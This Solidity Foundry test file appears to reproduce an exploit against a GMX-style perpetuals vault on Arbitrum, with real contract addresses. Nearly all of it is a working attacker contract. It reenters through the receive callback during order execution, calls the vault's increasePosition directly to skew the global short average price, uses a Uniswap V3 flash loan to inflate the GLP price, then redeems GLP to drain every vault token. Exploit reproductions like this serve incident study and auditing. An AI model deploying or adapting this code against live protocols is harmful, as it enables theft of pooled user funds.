// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IVault, IVaultUtils} from "./IVault.sol";
import {IOrderBook} from "./IOrderBook.sol";
import {IRouter} from "./IRouter.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {IUniswapV3Pair} from "../../utils/IUniswapV3Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IRewardRouterV2} from "./IRewardRouterV2.sol";
import {IGlpManager} from "./IGlpManager.sol";

import {IPositionRouter} from "./IPositionRouter.sol";

// Attacker's Smart Contract 1
contract ExploitSC is TestHarness, TokenBalanceTracker {
    IRouter internal constant ROUTER =
        IRouter(0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064);

    IVault internal constant VAULT =
        IVault(0x489ee077994B6658eAfA855C308275EAd8097C4A);

    IOrderBook internal constant ORDER_BOOK =
        IOrderBook(0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB);

    IERC20 internal constant GLP =
        IERC20(0x4277f8F2c384827B5273592FF7CeBd9f2C1ac258);

    IERC20 internal constant USDC =
        IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);

    IUniswapV3Pair internal constant WETH_USDC_POOL =
        IUniswapV3Pair(0xC6962004f452bE9203591991D15f6b388e09E8D0);

    IGlpManager internal constant GLP_MANAGER =
        IGlpManager(0x3963FfC9dff443c2A94f21b129D429891E32ec18);

    IRewardRouterV2 internal constant REWARD_ROUTER_V2 =
        IRewardRouterV2(0xB95DB5B167D75e6d04227CfFFA61069348d271F5);

    IERC20 internal constant WBTC =
        IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);

    IWETH9 internal constant WETH =
        IWETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);

    IERC20 internal constant USDCE =
        IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

    IERC20 internal constant LINK =
        IERC20(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4);

    IERC20 internal constant UNI =
        IERC20(0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0);

    IERC20 internal constant USDT =
        IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);

    IERC20 internal constant FRAX =
        IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);

    IERC20 internal constant DAI =
        IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);

    IPositionRouter internal constant POSITION_ROUTER =
        IPositionRouter(0xb87a436B93fFE9D75c5cFA7bAcFff96430b09868);

    // Array of tokens
    address[] internal tokens = [
        address(WBTC),
        address(WETH),
        address(USDCE),
        address(LINK),
        address(UNI),
        address(USDT),
        address(FRAX),
        address(DAI)
    ];

    uint8[] internal tokenDecimals = [
        8, // WBTC
        18, // WETH
        6, // USDCE
        18, // LINK
        18, // UNI
        6, // USDT
        18, // FRAX
        18 // DAI
    ];

    function createIncreaseOrder() external payable {
        ROUTER.approvePlugin(address(ORDER_BOOK));

        uint256 wethMinPrice = VAULT.getMinPrice(address(WETH));

        uint256 executionFee = 300000000000000;

        // Uses 20% of current WETH price as sizeDelta
        uint256 sizeDelta = wethMinPrice * 10**17 * 2 / 10**18;
        
        address[] memory path = new address[](1);
        path[0] = address(WETH);

        uint256 ethValue = 10 ** 17 + executionFee;

        ORDER_BOOK.createIncreaseOrder{value: ethValue}(
            path,
            100000000000000000,
            address(WETH),
            0,
            sizeDelta,
            address(WETH),
            true,
            1500000000000000000000000000000000,
            true,
            executionFee,
            true
        );
    }

    function createDecreaseOrder() external payable {
        ROUTER.approvePlugin(address(ORDER_BOOK));

        IVault.Position memory position = VAULT.getPosition(
            address(this),
            address(WETH),
            address(WETH),
            true
        );

        uint256 executionFee = 300000000000000;

        ORDER_BOOK.createDecreaseOrder{value: executionFee}(
            address(WETH),
            position.size / 10,
            address(WETH),
            position.collateral / 10,
            true,
            1500000000000000000000000000000000,
            true
        );
    }

    receive() external payable {
        // 6. The receive function is triggered when the keeper executes the decrease order.
        // It checks the state of the protocol and executes different logic based on the conditions.
        // The check is done by comparing the max price of WBTC with the global short average price.
        uint256 wbtcGlobalShortAveragePrice = GLP_MANAGER
            .getGlobalShortAveragePrice(address(WBTC));

        uint256 wbtcMaxPrice = VAULT.getMaxPrice(address(WBTC));

        require(
            wbtcMaxPrice > wbtcGlobalShortAveragePrice,
            "Max price is not greater than global short average price"
        );

        // If the max price is more than 50 times greater than the global short average price, it executes the final logic of the exploit. If not it executes the logic that increases the position size and creates a decrease position order.
        // 6.A Final logic of the exploit
        // 6.B Logic that keeps the exploit going

        // First N iterations will execute the 6.B path, and then when the condition is met it will execute the 6.A path

        if (wbtcMaxPrice / wbtcGlobalShortAveragePrice > 50) {
            console2.log(
                "Max price is more than 50 times greater than global short average price\n"
            );

            // 6.A.1 Now that the gap between the max price and the global short average price is big enough, it can be exploited by using a flashloan to increase the position size in the vault.

            // Get vault state
            uint256 usdcReservedAmount = VAULT.reservedAmounts(address(USDC));
            uint256 usdcPoolAmount = VAULT.poolAmounts(address(USDC));
            uint256 usdgAmount = VAULT.usdgAmounts(address(USDC));
            uint256 maxUsdgAmount = VAULT.maxUsdgAmounts(address(USDC));

            // Calculations
            uint256 availableLiquidity = usdcPoolAmount - usdcReservedAmount;
            uint256 liquidityBuffer = availableLiquidity / 10; // 10% of available liquidity

            uint256 remainingUsdgCapacity = maxUsdgAmount - usdgAmount;
            uint256 scaledCapacity = (remainingUsdgCapacity / 10**24) * 10**12;

            uint256 capacityAdjusted = (scaledCapacity * 9) / 100; // 9% adjustment on capacity
            uint256 flashLoanAmount = liquidityBuffer + capacityAdjusted + scaledCapacity;

            // 6.A.2 Prepare the parameters and execute the flashloan
            uint256 amount0 = 0;
            uint256 amount1 = flashLoanAmount;

            bytes memory data = abi.encode(liquidityBuffer + capacityAdjusted, scaledCapacity);

            WETH_USDC_POOL.flash(address(this), amount0, amount1, data);
        } else {
            console2.log(
                "Max price is not more than 50 times greater than global short average price\n"
            );

            // 6.B.1 Because at this moment the executeDecreseOrder call has not finished yet, leverage is still enabled and increasePosition function can be called directly in the Vault contract, bypassing the update of the global short average price. This means that the gap between the max price and the global short average price will keep increasing.

            // To increase position in the vault, two steps are required:
            // 1. Transfer funds to the vault
            // 2. Call increasePosition function in the vault
        
            uint256 usdcBalance = USDC.balanceOf(address(this));
            USDC.transfer(
                address(VAULT),
                usdcBalance
            );

            uint256 maxPrice = VAULT.getMaxPrice(address(USDC));

            uint256 sizeDelta = (maxPrice * usdcBalance * 30) / (10 ** 6);
            
            VAULT.increasePosition(
                address(this),
                address(USDC),
                address(WBTC),
                sizeDelta,
                false
            );

            // 6.B.2 Get the size of the current position in the vault
            // and create a decrease position order in the PositionRouter contract
            // using as a sizeDelta the size of the current position, and this contract as the callback target
            // CHECK step 7 in the main loop in test_attack() function
            IVault.Position memory position = VAULT.getPosition(
                address(this),
                address(USDC),
                address(WBTC),
                false
            );

            ROUTER.approvePlugin(address(POSITION_ROUTER));

            address[] memory path = new address[](1);
            path[0] = address(USDC);

            POSITION_ROUTER.createDecreasePosition{value: 3000000000000000}(
                path,
                address(WBTC),
                0, // collateralDelta
                position.size, // sizeDelta
                false, // isLong
                address(this), // receiver
                120000000000000000000000000000000000, // acceptablePrice
                0, // minOut
                3000000000000000, // executionFee
                false, // withdrawETH
                address(this) // callbackTarget
            );
        }
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        // 6.A.3 This callback is triggered when the flashloan is executed.
        
        //Decode data as 2 uint256 values
        (uint256 value1, uint256 value2) = abi.decode(data, (uint256, uint256));

        // 6.A.4 Mints GLP tokens at the current market price
        USDC.approve(address(GLP_MANAGER), value2);
        REWARD_ROUTER_V2.mintAndStakeGlp(address(USDC), value2, 0, 0);

        // 6.A.5 Opens a huge short position in the vault, and because the average price is not updated, the system inmeadiately considers the PnL from the position
        // making the price of GLP tokens increase a lot
        USDC.transfer(address(VAULT), value1);
        uint256 maxPrice = VAULT.getMaxPrice(address(USDC));
        uint256 sizeDelta = (maxPrice * value1 * 10) / (10 ** 6);
        VAULT.increasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            sizeDelta,
            false
        );

        // 6.A.6 Using the previously minted GLP tokens, currently worth much more as the price was artificially inflated, it iterates through all the tokens in the vault, calculating the amount of GLP tokens that can be redeemed for each token based on the available liquidity in the vault and redeems them.
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);

            uint256 tokenDecimal = tokenDecimals[i];
            uint256 aum = GLP_MANAGER.getAum(false);
            uint256 glpTotalSupply = GLP.totalSupply();
            uint256 reservedAmount = VAULT.reservedAmounts(address(token));
            uint256 poolAmount = VAULT.poolAmounts(address(token));
            uint256 tokenMinPrice = VAULT.getMinPrice(address(token));

            // Calculate the value of the 'available' token amount in a normalized format (e.g., USD equivalent)
            // (poolAmount - reservedAmount) gives the truly available liquidity for the token.
            // Multiplying by tokenMinPrice and dividing by 10^tokenDecimal converts this into a standard value unit,
            // effectively removing the token's specific decimal scaling.
            uint256 availableTokenValueNormalized = (tokenMinPrice *
                (poolAmount - reservedAmount)) / (10 ** tokenDecimal);

            // Apply a small cut (0.1%) to the calculated value
            uint256 adjustedAvailableTokenValue = (availableTokenValueNormalized *
                    900) / 1000;

            // Calculate the amount of GLP tokens that corresponds to the adjusted available token value.
            // This uses the standard GMX formula: (AssetValue / AUM) * GLP_TotalSupply = Redeemable GLP Amount
            uint256 glpAmountToRedeem = (adjustedAvailableTokenValue *
                glpTotalSupply) / aum;

            REWARD_ROUTER_V2.unstakeAndRedeemGlp(
                address(token),
                glpAmountToRedeem,
                0,
                address(this)
            );
        }

        // After redeeming GLP tokens for all the available tokens in the vault, the attacker targets remaining FRAX and USDC
        
        IVault.Position memory position = VAULT.getPosition(
            address(this),
            address(USDC),
            address(WBTC),
            false
        );

        VAULT.decreasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            0,
            position.size,
            false,
            address(this)
        );

        FRAX.approve(
            address(GLP_MANAGER),
            9000000000000000000000000
        );

        REWARD_ROUTER_V2.mintAndStakeGlp(
            address(FRAX),
            9000000000000000000000000,
            0,
            0
        );

        USDC.transfer(
            address(VAULT),
            500000000000
        );

        uint256 usdcMaxPrice = VAULT.getMaxPrice(address(USDC));
        sizeDelta = (usdcMaxPrice * 500000000000 * 25) / (10 ** 6);
        
        VAULT.increasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            sizeDelta,
            false
        );

        uint256 aum = GLP_MANAGER.getAum(false);
        uint256 glpTotalSupply = GLP.totalSupply();
        uint256 reservedAmount = VAULT.reservedAmounts(address(FRAX));
        uint256 poolAmount = VAULT.poolAmounts(address(FRAX));

        uint256 glpAmount = (poolAmount - reservedAmount) * 10**12 * 999 / 1000 * glpTotalSupply / aum;
        
        REWARD_ROUTER_V2.unstakeAndRedeemGlp(
            address(FRAX),
            glpAmount,
            0,
            address(this)
        );

        position = VAULT.getPosition(
            address(this),
            address(USDC),
            address(WBTC),
            false
        );

        VAULT.decreasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            0,
            position.size,
            false,
            address(this)
        );

        FRAX.approve(
            address(GLP_MANAGER),
            9000000000000000000000000
        );

        REWARD_ROUTER_V2.mintAndStakeGlp(
            address(FRAX),
            9000000000000000000000000,
            0,
            0
        );

        USDC.transfer(
            address(VAULT),
            500000000000
        );

        usdcMaxPrice = VAULT.getMaxPrice(address(USDC));
        sizeDelta = (usdcMaxPrice * 500000000000 * 25) / (10 ** 6);
        VAULT.increasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            sizeDelta,
            false
        );

        aum = GLP_MANAGER.getAum(false);
        glpTotalSupply = GLP.totalSupply();
        reservedAmount = VAULT.reservedAmounts(address(FRAX));
        poolAmount = VAULT.poolAmounts(address(FRAX));

        glpAmount = (poolAmount - reservedAmount) * 10**12 * 999 / 1000 * glpTotalSupply / aum;
        
        REWARD_ROUTER_V2.unstakeAndRedeemGlp(
            address(FRAX),
            glpAmount,
            0,
            address(this)
        );

        position = VAULT.getPosition(
            address(this),
            address(USDC),
            address(WBTC),
            false
        );
        
        VAULT.decreasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            0,
            position.size,
            false,
            address(this)
        );

        FRAX.approve(
            address(GLP_MANAGER),
            400000000000000000000000
        );

        REWARD_ROUTER_V2.mintAndStakeGlp(
            address(FRAX),
            400000000000000000000000,
            0,
            0
        );

        FRAX.transfer(
            address(VAULT),
            10 ** 22
        );

        maxPrice = VAULT.getMaxPrice(address(FRAX));
        sizeDelta = (maxPrice * (10 ** 22) * 38) / (10 ** 18);

        VAULT.increasePosition(
            address(this),
            address(FRAX),
            address(WBTC),
            sizeDelta,
            false
        );

        aum = GLP_MANAGER.getAum(false);
        glpTotalSupply = GLP.totalSupply();
        reservedAmount = VAULT.reservedAmounts(address(USDC));
        poolAmount = VAULT.poolAmounts(address(USDC));

        glpAmount = (poolAmount - reservedAmount) * 10**24 * 999 / 1000 * glpTotalSupply / aum;

        REWARD_ROUTER_V2.unstakeAndRedeemGlp(
            address(USDC),
            glpAmount,
            0,
            address(this)
        );

        position = VAULT.getPosition(
            address(this),
            address(FRAX),
            address(WBTC),
            false
        );

        VAULT.decreasePosition(
            address(this),
            address(FRAX),
            address(WBTC),
            0,
            position.size,
            false,
            address(this)
        );

        // 6.A.7 After the exploit is completed, it pays back the flashloan
        USDC.transfer(msg.sender, value1 + value2 + fee1);
    }

    function gmxPositionCallback(bytes32 positionKey, bool isExecuted, bool isIncrease) external{
        // 8. This function is called when the decreasePosition is executed by the Updater.
        // It creates a new decrease position order that will be executed in the next iteration by the keeper, keeping the loop going
        // CONTINUES in the main loop in test_attack() function
        require(msg.sender == address(POSITION_ROUTER), "Unauthorized callback");

        ORDER_BOOK.createDecreaseOrder{value: 3000000000000000}(
            address(WETH),
            53106400000000000000000000000000,
            address(WETH),
            26517133600000000000000000000000,
            true,
            1500000000000000000000000000000000,
            true
        );
    }
}